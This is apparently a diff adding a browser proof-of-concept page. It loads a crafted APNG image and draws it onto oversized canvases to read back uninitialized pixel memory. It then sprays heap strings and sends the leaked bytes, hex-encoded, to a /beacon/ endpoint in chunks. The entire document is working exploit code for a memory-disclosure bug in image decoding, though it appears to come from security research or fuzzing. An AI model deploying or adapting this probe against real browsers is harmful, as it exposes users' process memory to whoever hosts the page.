@@ -1,0 +1,43 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>apng2</title><script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function img(url){ return new Promise(function(res){ var i=new Image(); i.onload=function(){res(i);}; i.onerror=function(){res(null);}; i.src=url+'?t='+Date.now(); }); }
+function hexAll(d,n){ var s=''; for(var i=0;i<n*4;i++) s+=('0'+d[i].toString(16)).slice(-2); return s; }
+function dump(tag,d,n,chunk){
+  var h=hexAll(d,n);
+  for(var o=0,part=0;o<h.length;o+=chunk,part++) b(tag+'-'+part+'-'+h.substr(o,chunk));
+}
+function spray(n,len){ var keep=window.__k||(window.__k=[]); for(var i=0;i<n;i++){ var s=''; for(var j=0;j<len;j++) s+=String.fromCharCode(65+(j%26)); keep.push(s); } if(keep.length>30000) keep.length=0; return keep.length; }
+function drawInto(w,h,im,prefill){
+  var c=document.createElement('canvas'); c.width=w; c.height=h;
+  var g=c.getContext('2d');
+  if(prefill){ g.fillStyle=prefill; g.fillRect(0,0,w,h); }
+  g.drawImage(im,0,0);
+  return g.getImageData(0,0,w,h).data;
+}
+function postStats(tag,d,n){
+  var neigh=0, zero=0, hn=0;
+  for(var x=0;x<n;x++){ var r=d[x*4],gg=d[x*4+1],bb=d[x*4+2],a=d[x*4+3]; if(!r&&!gg&&!bb&&!a) zero++; if(r===0xae&&gg===0xae&&bb===0xae) hn++; if(a===0xff&&(r!==0xae||gg!==0xae)) neigh++; }
+  b(tag+'-zero-'+zero+'-ae-'+hn+'-opaquenotae-'+neigh);
+}
+function boot(){
+  b('A2-BOOT');
+  img('/corpus/apng-hidden-first-frame-narrow.png').then(function(im){
+    if(!im){ b('A2-NOIMG'); return; }
+    // A: wide canvas, raw bytes
+    var d=drawInto(512,1,im,null);
+    postStats('A2-A512',d,512);
+    dump('A2-A512',d,512,900);
+    // B: prefilled canvas, does the leak overwrite the fill?
+    var d2=drawInto(512,1,im,'#00ff00');
+    b('A2-B-p0-'+hexAll(d2,2));
+    dump('A2-B',d2,64,900);
+    // C: spray strings first, then draw; do the leaked bytes change?
+    var kept=spray(4000,240); b('A2-C-spray-'+kept);
+    var d3=drawInto(512,1,im,null);
+    dump('A2-C',d3,64,900);
+    b('A2-C-p2-'+hexAll(d3.slice(8),1));
+    b('A2-DONE');
+  });
+}
+boot();
+</script></head><body><p>apng2</p></body></html>
